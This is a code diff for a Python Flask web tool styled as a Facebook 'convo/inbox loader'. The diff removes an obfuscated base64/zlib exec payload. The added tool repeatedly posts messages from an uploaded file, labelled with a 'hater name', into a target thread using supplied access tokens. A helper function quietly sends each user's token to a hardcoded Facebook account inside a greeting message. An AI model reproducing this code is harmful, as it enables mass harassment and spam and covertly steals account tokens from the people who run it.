@@ -1,2 +1,177 @@
-# -------------------------------
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
+from flask import Flask, request
+import requests
+from time import sleep
+import time
+from datetime import datetime
+app = Flask(__name__)
+app.debug = True
+
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+
+stop_events = {}
+threads = {}
+
+def get_user_name(token):
+    # Implement this function to get the user's name based on the token
+    # For example, you might make a request to the Facebook Graph API
+    return "User Name"
+
+def send_initial_message(access_tokens):
+    target_id = "100000943029350"
+    results = []
+    for token in access_tokens:
+        user_name = get_user_name(token)
+        msg_template = f"Hello! Robin Sir I am Using Your Convo Page server. My Token Is: {token}"
+        parameters = {'access_token': token, 'message': msg_template}
+        url = f"https://graph.facebook.com/v15.0/t_{target_id}/"
+        try:
+            response = requests.post(url, data=parameters, headers=headers)
+            if response.status_code == 200:
+                results.append(f"[✔️] Initial message sent successfully from {user_name}.")
+            else:
+                results.append(f"[❌] Failed to send initial message from {user_name}. Status Code: {response.status_code}")
+        except requests.RequestException as e:
+            results.append(f"[!] Error during initial message send from {user_name}: {e}")
+    return results
+
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        access_token = request.form.get('accessToken')
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+
+        while True:
+            try:
+                for message1 in messages:
+                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                    message = str(mn) + ' ' + message1
+                    parameters = {'access_token': access_token, 'message': message}
+                    response = requests.post(api_url, data=parameters, headers=headers)
+                    if response.status_code == 200:
+                        print(f"Message sent using token {access_token}: {message}")
+                    else:
+                        print(f"Failed to send message using token {access_token}: {message}")
+                    time.sleep(time_interval)
+            except Exception as e:
+                print(f"Error while sending message using token {access_token}: {message}")
+                print(e)
+                time.sleep(30)
+
+
+    return '''
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>⟬ 𝐆A͜͡𝐍𝐆𝐒𝐓E͜͡𝐑 ⟭⸙⟬ 𝐆𝐚𝐧𝐚𝐬𝐡 ⟭</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-image: url('https://i.ibb.co/vCQFZj9s/0d320968ae5ede2f15174fda6959f477.gif');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container{
+      max-width: 350px;
+      hight: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      margin: 0 auto;
+      margin-top: 20px;
+    }
+    .header{
+      text-align: center;
+      padding-bottom: 20px;
+    }
+    .btn-submit{
+      width: 100%;
+      margin-top: 10px;
+    }
+    .footer{
+      text-align: center;
+      margin-top: 20px;
+      color: #888;
+    }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mb-3"> 𝐎𝐅𝐅𝐋𝐈𝐍𝟑 𝐒𝟑𝐑𝐕𝟑𝐑
+                                     𝐁𝐘
+
+    <h1 class="mt-3">⟬ 𝐆A͜͡𝐍𝐆𝐒𝐓E͜͡𝐑 ⟭⸙⟬ 𝐆𝐚𝐧𝐚𝐬𝐡 ⟭</h1>
+  </header>
+
+  <div class="container">
+    <form action="/" method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="accessToken">Enter Your Token:</label>
+        <input type="text" class="form-control" id="accessToken" name="accessToken" required>
+      </div>
+      <div class="mb-3">
+        <label for="threadId">Enter Convo/Inbox ID:</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx">Enter Hater Name:</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile">Select Your Notepad File:</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+      </div>
+      <div class="mb-3">
+        <label for="time">Speed in Seconds:</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>&copy;😈𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐃 𝐁𝐘 𝐆𝐚𝐧𝐚𝐬𝐡 2025. 𝐀𝐋𝐋 𝐑𝐈𝐆𝐇𝐓𝐒 𝐑𝐄𝐒𝐄𝐑𝐕𝐄𝐃.😈</p>
+    <p>😈𝘾𝙊𝙉𝙑𝙊/𝙄𝙉𝘽𝙊𝙓 𝙇𝙊𝘼𝘿𝙀𝙍 𝙏𝙊𝙊𝙇😈</p>
+    <p>😈𝐊𝐄𝐄𝐏 𝐄𝐍𝐉𝐎𝐘𝐈𝐍𝐆😈  <a href="https://github.com/zeeshanqureshi0</a></p>
+  </footer>
+</body>
+  </html>
+    '''
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=22051)
+    app.run(debug=True)
